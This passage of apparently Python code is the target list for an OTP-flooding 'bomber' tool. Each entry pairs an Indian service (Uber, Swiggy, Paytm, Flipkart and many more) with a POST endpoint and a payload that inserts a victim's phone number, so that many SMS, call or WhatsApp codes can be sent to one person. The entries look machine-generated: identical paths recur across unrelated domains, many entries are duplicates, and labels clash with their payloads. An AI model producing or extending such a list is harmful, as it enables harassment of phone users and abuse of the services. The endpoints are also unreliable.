    {'name': 'Myntra WhatsApp', 'url': 'https://myntra.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Uber SMS', 'url': 'https://uber.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Api-Gateway SMS', 'url': 'https://api-gateway.juno.lenskart.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Goibibo SMS', 'url': 'https://goibibo.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Newme Call', 'url': 'https://newme.asia/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Cred SMS', 'url': 'https://cred.club/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Swiggy WhatsApp', 'url': 'https://swiggy.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Paytm SMS', 'url': 'https://paytm.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Instamart SMS', 'url': 'https://instamart.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Zepto WhatsApp', 'url': 'https://zepto.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Uber WhatsApp', 'url': 'https://uber.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Dmart SMS', 'url': 'https://dmart.ready.in/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Amazon WhatsApp', 'url': 'https://amazon.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Cred Call', 'url': 'https://cred.club/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Pokerbaazi WhatsApp', 'url': 'https://pokerbaazi.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Khatabook SMS', 'url': 'https://khatabook.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Instamart Call', 'url': 'https://instamart.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Phonepe WhatsApp', 'url': 'https://phonepe.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Cred WhatsApp', 'url': 'https://cred.club/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Flipkart Call', 'url': 'https://flipkart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Jupiter WhatsApp', 'url': 'https://jupiter.money/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Tatacapital Call', 'url': 'https://tatacapital.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Uber WhatsApp', 'url': 'https://uber.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Oyorooms Call', 'url': 'https://oyorooms.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Wakefit Call', 'url': 'https://wakefit.co/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Ajio Call', 'url': 'https://ajio.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Olacabs WhatsApp', 'url': 'https://olacabs.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Myntra Call', 'url': 'https://myntra.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Bigbasket SMS', 'url': 'https://bigbasket.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Uber Call', 'url': 'https://uber.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Instamart SMS', 'url': 'https://instamart.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Jupiter SMS', 'url': 'https://jupiter.money/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Tatacapital Call', 'url': 'https://tatacapital.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Cred WhatsApp', 'url': 'https://cred.club/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Pokerbaazi SMS', 'url': 'https://pokerbaazi.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Oyorooms SMS', 'url': 'https://oyorooms.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Olacabs SMS', 'url': 'https://olacabs.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Olacabs Call', 'url': 'https://olacabs.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Dmart Call', 'url': 'https://dmart.ready.in/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Amazon Call', 'url': 'https://amazon.in/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Makemytrip SMS', 'url': 'https://makemytrip.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Api-Gateway SMS', 'url': 'https://api-gateway.juno.lenskart.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Newme SMS', 'url': 'https://newme.asia/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Pharmeasy SMS', 'url': 'https://pharmeasy.in/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Phonepe Call', 'url': 'https://phonepe.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Nykaa WhatsApp', 'url': 'https://nykaa.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Swiggy WhatsApp', 'url': 'https://swiggy.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Zepto WhatsApp', 'url': 'https://zepto.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Dmart SMS', 'url': 'https://dmart.ready.in/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Meesho Call', 'url': 'https://meesho.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Dmart WhatsApp', 'url': 'https://dmart.ready.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Zivame SMS', 'url': 'https://zivame.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Ajio Call', 'url': 'https://ajio.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Dmart Call', 'url': 'https://dmart.ready.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Newme WhatsApp', 'url': 'https://newme.asia/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Olacabs SMS', 'url': 'https://olacabs.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Gokwik SMS', 'url': 'https://gokwik.co/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Phonepe SMS', 'url': 'https://phonepe.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': '1Mg Call', 'url': 'https://1mg.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Khatabook Call', 'url': 'https://khatabook.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Cred SMS', 'url': 'https://cred.club/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': '1Mg SMS', 'url': 'https://1mg.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Tatacapital Call', 'url': 'https://tatacapital.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Pokerbaazi SMS', 'url': 'https://pokerbaazi.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Instamart SMS', 'url': 'https://instamart.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Zomato SMS', 'url': 'https://zomato.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Instamart SMS', 'url': 'https://instamart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Uber Call', 'url': 'https://uber.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Goibibo SMS', 'url': 'https://goibibo.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Dmart WhatsApp', 'url': 'https://dmart.ready.in/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Flipkart Call', 'url': 'https://flipkart.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Jupiter Call', 'url': 'https://jupiter.money/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Swiggy Call', 'url': 'https://swiggy.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Phonepe WhatsApp', 'url': 'https://phonepe.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Newme Call', 'url': 'https://newme.asia/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Zivame WhatsApp', 'url': 'https://zivame.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Zivame WhatsApp', 'url': 'https://zivame.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Wakefit SMS', 'url': 'https://wakefit.co/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Olacabs SMS', 'url': 'https://olacabs.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Zomato WhatsApp', 'url': 'https://zomato.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': '1Mg SMS', 'url': 'https://1mg.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Makemytrip WhatsApp', 'url': 'https://makemytrip.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Olacabs SMS', 'url': 'https://olacabs.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Swiggy WhatsApp', 'url': 'https://swiggy.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Khatabook SMS', 'url': 'https://khatabook.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Uber SMS', 'url': 'https://uber.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Zepto WhatsApp', 'url': 'https://zepto.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Blinkit SMS', 'url': 'https://blinkit.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Flipkart SMS', 'url': 'https://flipkart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Zivame WhatsApp', 'url': 'https://zivame.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Gokwik Call', 'url': 'https://gokwik.co/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Dmart WhatsApp', 'url': 'https://dmart.ready.in/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Flipkart SMS', 'url': 'https://flipkart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Blinkit Call', 'url': 'https://blinkit.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Meesho SMS', 'url': 'https://meesho.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Rapido WhatsApp', 'url': 'https://rapido.bike/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Pharmeasy SMS', 'url': 'https://pharmeasy.in/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Ajio SMS', 'url': 'https://ajio.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Uber SMS', 'url': 'https://uber.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Uber SMS', 'url': 'https://uber.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Wakefit SMS', 'url': 'https://wakefit.co/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Paytm SMS', 'url': 'https://paytm.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Zomato SMS', 'url': 'https://zomato.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Gokwik Call', 'url': 'https://gokwik.co/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Myntra SMS', 'url': 'https://myntra.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Jupiter SMS', 'url': 'https://jupiter.money/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Zepto SMS', 'url': 'https://zepto.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Olacabs SMS', 'url': 'https://olacabs.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Cred WhatsApp', 'url': 'https://cred.club/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Zepto Call', 'url': 'https://zepto.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Instamart WhatsApp', 'url': 'https://instamart.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Pokerbaazi SMS', 'url': 'https://pokerbaazi.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Dmart SMS', 'url': 'https://dmart.ready.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Uber WhatsApp', 'url': 'https://uber.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Rapido Call', 'url': 'https://rapido.bike/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Flipkart Call', 'url': 'https://flipkart.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Doubtnut WhatsApp', 'url': 'https://doubtnut.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Zomato SMS', 'url': 'https://zomato.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Olacabs SMS', 'url': 'https://olacabs.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Doubtnut Call', 'url': 'https://doubtnut.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Wakefit Call', 'url': 'https://wakefit.co/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Api-Gateway SMS', 'url': 'https://api-gateway.juno.lenskart.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Newme SMS', 'url': 'https://newme.asia/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Zomato WhatsApp', 'url': 'https://zomato.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Makemytrip WhatsApp', 'url': 'https://makemytrip.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Shiprocket WhatsApp', 'url': 'https://shiprocket.in/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Shiprocket WhatsApp', 'url': 'https://shiprocket.in/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Phonepe Call', 'url': 'https://phonepe.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Wakefit SMS', 'url': 'https://wakefit.co/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
